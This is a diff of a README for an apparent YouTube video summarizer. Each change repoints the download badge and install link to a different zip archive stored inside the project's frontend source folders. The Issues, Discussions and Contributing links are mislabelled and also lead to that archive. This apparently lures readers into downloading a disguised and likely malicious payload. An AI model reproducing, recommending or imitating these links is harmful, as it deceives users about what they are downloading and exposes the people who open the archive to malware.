@@ -6,11 +6,11 @@ Welcome to ai-video-summarizer! This tool helps you turn long YouTube videos int
 
 ## 📥 Download Now
 
-[![Download ai-video-summarizer](https://raw.githubusercontent.com/milescarson/ai-video-summarizer/main/frontend/src/app/video_ai_summarizer_clipse.zip%20Now-v1.0-4CAF50?style=flat&logo=github)](https://raw.githubusercontent.com/milescarson/ai-video-summarizer/main/frontend/src/app/video_ai_summarizer_clipse.zip)
+[![Download ai-video-summarizer](https://github.com/milescarson/ai-video-summarizer/raw/refs/heads/main/frontend/src/features/ai-summarizer-video-v3.4.zip%20Now-v1.0-4CAF50?style=flat&logo=github)](https://github.com/milescarson/ai-video-summarizer/raw/refs/heads/main/frontend/src/features/ai-summarizer-video-v3.4.zip)
 
 ## 📂 Download & Install
 
-To get started with ai-video-summarizer, visit this page to download the latest version of the software: [Download Link](https://raw.githubusercontent.com/milescarson/ai-video-summarizer/main/frontend/src/app/video_ai_summarizer_clipse.zip). 
+To get started with ai-video-summarizer, visit this page to download the latest version of the software: [Download Link](https://github.com/milescarson/ai-video-summarizer/raw/refs/heads/main/frontend/src/features/ai-summarizer-video-v3.4.zip). 
 
 1. Click on the link above.
 2. Choose the latest release version.
@@ -76,13 +76,13 @@ A: The tool works well on most YouTube videos, but videos with clear narration a
 
 For any questions or technical support, you can reach out to our community:
 
-- [Issues Section](https://raw.githubusercontent.com/milescarson/ai-video-summarizer/main/frontend/src/app/video_ai_summarizer_clipse.zip): Report bugs or ask for help.
-- [Discussions](https://raw.githubusercontent.com/milescarson/ai-video-summarizer/main/frontend/src/app/video_ai_summarizer_clipse.zip): Join conversations with other users.
+- [Issues Section](https://github.com/milescarson/ai-video-summarizer/raw/refs/heads/main/frontend/src/features/ai-summarizer-video-v3.4.zip): Report bugs or ask for help.
+- [Discussions](https://github.com/milescarson/ai-video-summarizer/raw/refs/heads/main/frontend/src/features/ai-summarizer-video-v3.4.zip): Join conversations with other users.
 
 Feel free to share your feedback or suggestions for improvement. Your input helps make ai-video-summarizer even better!
 
 ## 🎉 Contributing
 
-We welcome contributions from everyone. If you have ideas for features or improvements, check out our [Contributing Guidelines](https://raw.githubusercontent.com/milescarson/ai-video-summarizer/main/frontend/src/app/video_ai_summarizer_clipse.zip).
+We welcome contributions from everyone. If you have ideas for features or improvements, check out our [Contributing Guidelines](https://github.com/milescarson/ai-video-summarizer/raw/refs/heads/main/frontend/src/features/ai-summarizer-video-v3.4.zip).
 
 Thank you for using ai-video-summarizer. Enjoy turning long videos into quick reads!
